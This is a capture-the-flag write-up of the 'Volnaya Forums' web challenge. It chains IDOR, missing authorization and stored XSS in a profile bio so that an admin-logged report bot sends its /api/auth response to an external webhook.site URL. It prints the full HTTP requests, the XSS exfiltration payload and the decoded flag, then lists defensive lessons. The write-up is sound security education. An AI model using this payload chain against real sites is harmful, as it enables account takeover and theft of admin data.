---
layaout: post
title: Volnaya Forums HTB Bussines CTF 2025
image: assets/images/vol_forum.png
date: 27-05-2025
categories: [Write ups]
tags: [web, whitebox]
excerpt: This walkthrough details the exploitation of a web application in a white-box CTF scenario, where we have access to the source code. The goal is to retrieve the flag stored in`/flag.txt, accessible via the /api/auth endpoint for the admin user.
---
![img-description](assets/volnaya/volnaya_desc.png)
## Objetive
---
The Volnaya Forums stand as a sprawling network where citizens compete to outdo each other in public displays of loyalty. Every post and reply is carefully monitored, and the most zealous praise is rewarded with higher loyalty scores. Behind the scenes, a small cadre of administrators wields absolute control, silencing dissent and shaping the narrative to serve the regime’s ambitions. Task Force Phoenix has identified the forum’s admin account as a critical target. Gaining access would allow the task force to disrupt the flow of propaganda and strike a blow against the regime’s information control. Recently, we managed to secure a backup copy of the forum server from an unsecured FTP server. Can you analyze the platform’s architecture and code to uncover any weaknesses that might grant us access to the admin account?
---

## Introduction

This walkthrough details the exploitation of a web application in a white-box CTF scenario, where we have access to the source code. The goal is to retrieve the flag stored in `/flag.txt`, accessible via the `/api/auth` endpoint for the admin user. The application contains vulnerabilities including **Insecure Direct Object Reference (IDOR)**, **Broken Access Control**, and **Cross-Site Scripting (XSS)**, compounded by **CORS restrictions** that necessitate a webhook for data exfiltration. We combine these with a bot-based report system to achieve our objective.

## Step-by-Step Exploitation

### 1. Understanding the Application
---
After registering an account, we can modify our user bio via the `/api/profile` endpoint:
![img-description](assets/volnaya/bio.png)
```
POST /api/profile HTTP/1.1
Host: 83.136.255.39:33887
Content-Type: application/json
Content-Length: 70
Cookie: session=Fe26.2*1*16ff6a805f9de48a36e3d9e33e820e6235446e56b7567c6c5a24295356b9c801*...

{"username":"whare","email":"wharesito@whare.com","bio":"<p>afsdfsdf</p>"}
```

Key observations:

- **No CSRF Protection**: The absence of CSRF tokens allows modifying other users’ profiles if we know their username and email.
- **XSS Vulnerability**: The `bio` field is not sanitized, enabling JavaScript injection. However, the `HttpOnly` flag on cookies prevents access to `document.cookie`.
- **Report Functionality**: The `/api/report` endpoint allows reporting posts, reviewed by a bot logged in as the admin, visiting the URL in the `postThread` field.
- **CORS Restrictions**: The `/api/auth` endpoint likely enforces CORS, restricting cross-origin requests from XSS payloads to external domains, necessitating a webhook for exfiltration.

The report request:

```
POST /api/report HTTP/1.1
Host: 83.136.255.39:33887
Content-Type: application/json
Content-Length: 39
Cookie: session=Fe26.2*1*16ff6a805f9de48a36e3d9e33e820e6235446e56b7567c6c5a24295356b9c801*...

{"postThread":"/post/id=12","reason":"Netrunners"}
```

### 2. Analyzing the Bot’s Behavior
---
The source code shows how the bot reviews reported posts:

```javascript
const reviewReport = async (forumThread: string) => {
    const browser = await puppeteer.launch(browser_options);
    const context = await browser.createBrowserContext();
    const page = await context.newPage();

    // Login as admin
    await page.goto(`http://127.0.0.1:1337/login`, { waitUntil: 'networkidle2' });
    await page.type('input[id="username"]', admin.username);
    await page.type('input[id="password"]', admin.password);
    await page.click('button[id="login-button"]');
    await page.waitForNetworkIdle();

    // Visit the reported URL
    const postURL = 'http://127.0.0.1:1337' + (forumThread.startsWith('/') ? forumThread : '/' + forumThread);
    await Promise.race([
        page.goto(postURL, { waitUntil: 'networkidle2' }),
        new Promise(resolve => setTimeout(resolve, 7000))
    ]);

    // Review for 5 seconds
    await new Promise(resolve => setTimeout(resolve, 5000));
    await browser.close();

    // Mark report as reviewed
    const stmt = db.prepare('UPDATE reports SET reviewed = 1 WHERE post_thread = ?');
    stmt.run(forumThread);
};
```

The bot:

- Logs in as admin.
- Visits the URL from `postThread` (e.g., `/profile` becomes `http://127.0.0.1:1337/profile`).
- Waits 5 seconds, allowing JavaScript (e.g., XSS payloads) to execute.

The `/profile` endpoint displays the logged-in user’s bio. Thus, when the bot visits `/profile`, it sees the admin’s bio.

### 3. Locating the Flag
---
The flag is in `/flag.txt` and exposed via `/api/auth` for admin users:

```javascript
// /app/pages/api/auth.ts
import fs from 'fs';
const flag = fs.readFileSync('/flag.txt', 'utf8').trim();

type AuthResponse = {
    authenticated: boolean;
    user?: {
        username: string;
        role: string;
        flag?: string;
    };
};
```

The admin’s `/api/auth` response includes `user.flag`.

### 4. Crafting the Attack Plan
---
To retrieve the flag:

1. **Exploit IDOR and Broken Access Control**: Modify the admin’s bio with an XSS payload, leveraging missing authorization checks in `/api/profile`.
2. **Inject XSS Payload**: Use the XSS vulnerability to fetch `/api/auth` and exfiltrate the response to a webhook, bypassing CORS restrictions.
3. **Trigger the Bot**: Submit a report with `postThread=/profile`, making the bot visit its own (admin) profile, execute the XSS, and send the flag to our webhook.

**CORS Consideration**: The `/api/auth` endpoint’s CORS policy likely prevents direct cross-origin requests to an attacker-controlled domain. We use a webhook (e.g., `webhook.site`) to receive the data, as it acts as a server-side relay, simplifying exfiltration.

### 5. Injecting XSS into the Admin’s Bio
---
We update the admin’s bio with an XSS payload using `/api/profile`. The payload uses an `<img>` tag with a broken `src` to trigger `onerror`, which:

- Fetches `/api/auth` to get the flag.
- Encodes the response in Base64 to handle special characters.
- Sends the data to our webhook, bypassing CORS restrictions.

Request:

```
POST /api/profile HTTP/1.1
Host: 83.136.255.39:33887
Content-Type: application/json
Content-Length: 197
Cookie: session=Fe26.2*1*16ff6a805f9de48a36e3d9e33e820e6235446e56b7567c6c5a24295356b9c801*...

{
  "username": "admin",
  "email": "admin@volnaya-forums.htb",
  "bio": "<img src=x onerror=\"fetch('/api/auth').then(r => r.text()).then(d => fetch('https://webhook.site/ddc68494-428e-4174-855d-f6d8bd631c18/?d=' + btoa(d)))\">"
}
```

This exploits:

- **IDOR**: Specifying the admin’s `username` and `email` without authorization.
- **Broken Access Control**: Modifying any user’s bio.
- **XSS**: Injecting JavaScript into the `bio` field.
- **CORS Bypass**: Using a webhook to receive data, as direct cross-origin requests to our server would be blocked.

### 6. Triggering the Bot
---
We submit a report to make the bot visit `/profile`:

```
POST /api/report HTTP/1.1
Host: 83.136.255.39:33887
Content-Type: application/json
Content-Length: 63
Cookie: session=Fe26.2*1*16ff6a805f9de48a36e3d9e33e820e6235446e56b7567c6c5a24295356b9c801*...

{"postThread":"/profile","reason":"Netrunners"}
```

The bot:

- Logs in as admin.
- Visits `http://127.0.0.1:1337/profile`.
- Loads the admin’s bio, triggering the XSS.
- Fetches `/api/auth` and sends the Base64-encoded response to our webhook.

### 7. Receiving and Decoding the Flag
---
The webhook receives the Base64-encoded `/api/auth` response:
![img-description](/assets/volnaya/webhook.png)
```
eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2YxeDR0M2RfcjNkMXIzYzczZF9wd24zZF81MDRkMTc2OWM0NjA3ZTJmOGE3OTk3ZTFlODJkOTY5Yn0ifX0=
```

Decoding:

```bash
echo 'eyJhdXRoZW50aWNhdGVkIjp0cnVlLCJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2YxeDR0M2RfcjNkMXIzYzczZF9wd24zZF81MDRkMTc2OWM0NjA3ZTJmOGE3OTk3ZTFlODJkOTY5Yn0ifX0=' | base64 -d
```

Output:

```json
{"authenticated":true,"user":{"username":"admin","role":"admin","flag":"HTB{f1x4t3d_r3d1r3c73d_pwn3d_504d1769c4607e2f8a7997e1e82d969b}"}}
```

Flag:

```
HTB{f1x4t3d_r3d1r3c73d_pwn3d_504d1769c4607e2f8a7997e1e82d969b}
```

## Conclusion

This CTF showcased a chain of vulnerabilities leading to flag extraction:

- **IDOR and Broken Access Control**: Unauthorized bio modification via `/api/profile`.
- **XSS**: Unsanitized `bio` field allowed JavaScript injection.
- **CORS Restrictions**: Necessitated a webhook for data exfiltration, as direct cross-origin requests were blocked.
- **Bot Misconfiguration**: The admin bot executed XSS by visiting user-controlled URLs.

### Lessons Learned

- **Sanitize Inputs**: Use libraries like DOMPurify to prevent XSS in fields like `bio`.
- **Enforce Authorization**: Validate user permissions to prevent IDOR and broken access control.
- **CSRF Tokens**: Protect API endpoints from unauthorized requests.
- **CORS Configuration**: Restrict CORS to trusted origins, but ensure sensitive endpoints require additional authentication (e.g., tokens) to prevent XSS-based abuse.
- **Bot Security**: Run bots in a non-privileged context and validate URLs.
- **Secure APIs**: Protect sensitive endpoints like `/api/auth` with strict access controls.

The use of a webhook to bypass CORS highlights a common technique in XSS exploitation. Developers must combine input validation, access controls, and secure CORS policies to prevent such attack chains.

![netrunner](/assets/images/netrunner.gif)